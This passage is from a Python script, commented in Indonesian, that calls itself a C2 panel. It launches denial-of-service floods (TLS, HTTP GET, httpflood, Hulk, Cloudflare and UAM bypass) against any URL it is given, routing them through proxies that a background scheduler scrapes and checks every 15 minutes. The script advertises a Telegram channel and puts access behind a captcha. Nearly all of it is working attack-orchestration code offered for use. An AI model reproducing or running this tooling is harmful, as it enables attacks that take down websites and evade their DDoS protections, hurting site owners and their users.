               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: http-requests <url> <waktu>')
                print('Contoh: http-requests http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "tls" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                               
               os.system(f'node tlsv2 {url} {time} 1 3 proxies.txt')
               os.system(f'node tlsv3 {url} {time} 1 3 proxies.txt')             
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: tls
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: tls <url> <waktu>')
                print('Contoh: tls http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 

        elif "auto" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                     
               os.system(f'node auto.js {url} {time} 1 3 proxies.txt')
               os.system(f'node autov2.js {url} {time} 1 3 proxies.txt')

               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 

               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: auto
               Ketik [CLS] untuk membersihkan terminal""")

               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()

            except IndexError:
                print('Penggunaan: auto <url> <waktu>')
                print('Contoh: auto http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")    

        elif "cf-bypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node cf.js {url} {time} 3 proxies.txt')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cf-bypass
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: cf-bypass <url> <waktu>')
                print('Contoh: cf-bypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "uambypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node uambypass.js {url} {time} 3 proxies.txt')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: uambypass
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: uambypass <url> <waktu>')
                print('Contoh: uambypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run Hulk.go -site {url} -data {method}')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
                
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
                
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node httpget GET {url} {time} 1 3 proxies.txt')
               os.system(f'node httpgetv2 GET {url} {time} 1 3 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: httpget
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: httpget <url> <waktu>')
                print('Contoh: httpget http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
                
        elif "http-storm" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node http-storm.js {url} {time} 1 3 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: http-storm
               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: http-storm <url> <waktu>')
                print('Contoh: http-storm http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")   
                                                                                                                                                                                 
# ==================== LOGIKA SCHEDULER & CAPTCHA ====================
# (Tempelkan blok ini di bagian paling akhir file c2.py Anda)

LOG_FILE = 'proxy_scheduler.log'

# Catatan: Fungsi clear_screen() dan si() sudah didefinisikan 
# di bagian atas skrip C2, jadi tidak perlu didefinisikan ulang di sini.

def log_message(message):
    """Menulis pesan ke file log."""
    # Menggunakan mode 'a' (append) untuk menambahkan pesan
    with open(LOG_FILE, 'a') as f:
        f.write(f"{message}\n")

def clear_log_file():
    """
    Menghapus isi file log setelah proses selesai. 
    Ini mencegah penumpukan log antar siklus.
    """
    try:
        # Menulis string kosong ke file, efektif mengosongkannya
        with open(LOG_FILE, 'w') as f:
            f.write("")
        # Pesan cleanup ini akan segera dihapus oleh pemanggilan berikutnya di akhir proses
        # log_message(f"🗑️ [CLEANUP] File log '{LOG_FILE}' telah dikosongkan.") 
    except Exception as e:
        # Mencetak ke stdout hanya jika gagal menulis log, sebagai fallback peringatan
        print(f"⚠️ PERINGATAN: Gagal mengosongkan file log: {e}")


# ==================== KONFIGURASI SCHEDULER ====================
try:
    import pytz # Asumsikan pytz sudah diimpor
    WIB = pytz.timezone('Asia/Jakarta')
except (ImportError, AttributeError, pytz.exceptions.UnknownTimeZoneError):
    WIB = None  

INTERVAL_SECONDS = 900 # 15 menit
# ===============================================================

def run_proxy_process():
    """
    Menjalankan proses pengambilan (getproxy.py) dan validasi (cekproxy.py) proxy.
    Semua output diarahkan ke LOG_FILE.
    (Fungsi ini berjalan di latar belakang)
    """
    
    # 1. Kosongkan log file sebelum memulai proses baru
    clear_log_file()
    
    if WIB:
        current_time = datetime.datetime.now(WIB).strftime('%Y-%m-%d %H:%M:%S')
    else:
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')

    log_message("\n" + "="*70)
    log_message(f"🚀 [START] Memulai proses koleksi dan validasi proxy pada: {current_time}")
    log_message("="*70)
    
    # Menjalankan skrip dan menangkap output ke log
    with open(LOG_FILE, 'a') as log_file:
        
        # 1. getproxy.py
        log_message("1. Memulai skrip pengambilan proxy (getproxy.py)...")
        try:
            # Output diarahkan ke log_file
            subprocess.run([sys.executable, 'getproxy.py'], check=True, stdout=log_file, stderr=log_file)
        except subprocess.CalledProcessError:
            log_message("❌ ERROR: Gagal menjalankan getproxy.py. Cek log.")
        except FileNotFoundError:
            log_message("🛑 ERROR: File getproxy.py tidak ditemukan.")
            return  
    
        # 2. cekproxy.py
        log_message("\n2. Pengambilan proxy selesai. Memulai validasi proxy (cekproxy.py)...")
        try:
            # Output diarahkan ke log_file
            subprocess.run([sys.executable, 'cekproxy.py'], check=True, stdout=log_file, stderr=log_file)
        except subprocess.CalledProcessError:
            log_message("❌ ERROR: Gagal menjalankan cekproxy.py. Cek log.")
        except FileNotFoundError:
            log_message("🛑 ERROR: File cekproxy.py tidak ditemukan.")
            return

    # Pesan selesai
    if WIB:
        end_time_wib = datetime.datetime.now(WIB).strftime('%Y-%m-%d %H:%M:%S')
    else:
        end_time_wib = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')

    log_message("\n" + "="*70)
    log_message(f"✅ [SUCCESS] Proses selesai pada: {end_time_wib}")
    log_message("Proxy aktif disimpan ke proxies.txt")
    log_message("="*70)

    # 2. Kosongkan kembali log file setelah proses selesai (fitur penghapus otomatis)
    clear_log_file()


def start_scheduler_loop():
    """
    Fungsi ini berisi loop tak terbatas dan HANYA DIPANGGIL oleh proses latar belakang.
    """
    if not WIB:
        log_message("PERINGATAN: Modul 'pytz' tidak ditemukan. Gunakan waktu lokal/sistem.")
    
    log_message(f"--- SCHEDULER PROXY AKTIF DIBELAKANG (Interval: {INTERVAL_SECONDS // 60} menit) ---")
    
    while True:
        try:
            run_proxy_process()
            
            # Hitung waktu untuk eksekusi berikutnya
            next_run_time_raw = datetime.datetime.now() + datetime.timedelta(seconds=INTERVAL_SECONDS)
            if WIB:
                  next_run_time = next_run_time_raw.astimezone(WIB).strftime('%Y-%m-%d %H:%M:%S')
            else:
                  next_run_time = next_run_time_raw.strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')

            # Jeda
            log_message(f"\n💤 Menunggu {INTERVAL_SECONDS // 60} menit...")
            log_message(f"Eksekusi Berikutnya Dijadwalkan pada: {next_run_time}")
            
            time.sleep(INTERVAL_SECONDS)
            
        except Exception as e:
            # Fatal error log akan tetap disimpan sebentar sebelum direset di siklus berikutnya
            log_message(f"\n[ERROR FATAL] Terjadi kesalahan tak terduga dalam loop: {e}")
            log_message(f"Mencoba lagi dalam 5 menit...")
            time.sleep(300) 


def post_login_message():
    """
    PERBAIKAN: Fungsi 'menu()' kedua diganti namanya menjadi 'post_login_message()'
    agar tidak bentrok dengan 'menu()' panel C2.
    """
    from termcolor import colored # Asumsikan colored sudah diimpor
    print(colored("---", "cyan"))
    print(colored("WELCOME TO school", "yellow"))
    
    # Tambahkan pesan untuk memandu pengguna
    print(colored(f"\nScheduler proxy berjalan di latar belakang.", "green", attrs=["bold"]))
    print(colored(f"Log sementara dicatat di '{LOG_FILE}' dan akan direset setiap kali proses selesai.", "yellow"))
    print(f"Untuk memantau log, cek file: {LOG_FILE}")


# ==================== FUNGSI CAPTCHA DAN LOGIN ====================

def generate_and_verify_captcha(length=4):
    from termcolor import colored # Asumsikan colored sudah diimpor
    while True:
        characters = string.ascii_uppercase
        captcha = ''.join(random.choice(characters) for _ in range(length))

        clear_screen()
        print("\n" + "="*30)
        print(f"{'CAPCTHA UNTUK VERIFIKASI'.center(30)}")
        print("="*30 + "\n")

        print(colored(f"    {captcha}    ", "green", attrs=["bold", "reverse"]))

        print("\n" + "="*30)
        user_input = input("Masukkan captcha di atas: ".ljust(30))

        if captcha == user_input.upper():
            print(colored("\nCaptcha benar!", "green"))
            time.sleep(1) 
            return True
        else:
            print(colored("\nCaptcha salah. Silakan coba lagi.", "red"))
            input("Tekan Enter untuk melanjutkan...")

def login():
    from termcolor import colored # Asumsikan colored sudah diimpor
    clear_screen()
    print("Memulai verifikasi CAPTCHA untuk akses script...")

    if generate_and_verify_captcha():
        print(colored("\nAkses Diberikan! Meluncurkan scheduler...", "green", attrs=["bold"]))
        
        # --- Peluncuran Proses Latar Belakang ---
        background_command = [sys.executable, os.path.abspath(__file__), '--run-scheduler']

        if os.name == 'nt': # Windows
            creation_flags = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
            subprocess.Popen(background_command, creationflags=creation_flags, close_fds=True)
            print(colored("✅ Scheduler berhasil diluncurkan di latar belakang (Windows).", "cyan"))
            
        else: # Unix/Linux/macOS
            subprocess.Popen(background_command, preexec_fn=os.setsid, close_fds=True)
            print(colored("✅ Scheduler berhasil diluncurkan di latar belakang (Unix).", "cyan"))
        
        time.sleep(1)
        
        # PERBAIKAN: Panggil pesan "WELCOME" di sini
        post_login_message()    
        
        return True
    else:
        return False

# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    
    if len(sys.argv) > 1 and sys.argv[1] == '--run-scheduler':
        # Mode 1: Jalankan sebagai scheduler latar belakang (headless)
        start_scheduler_loop()  
        
    else:
        # Mode 2: Jalankan sebagai mode interaktif (CAPTCHA)
        if login():
            # PERBAIKAN: Panggil 'main()' (C2 Loop) bukan 'menu()'
            main()
        else:
            print(colored("\nScript tidak dapat diakses.", "red"))
# ...                                                                          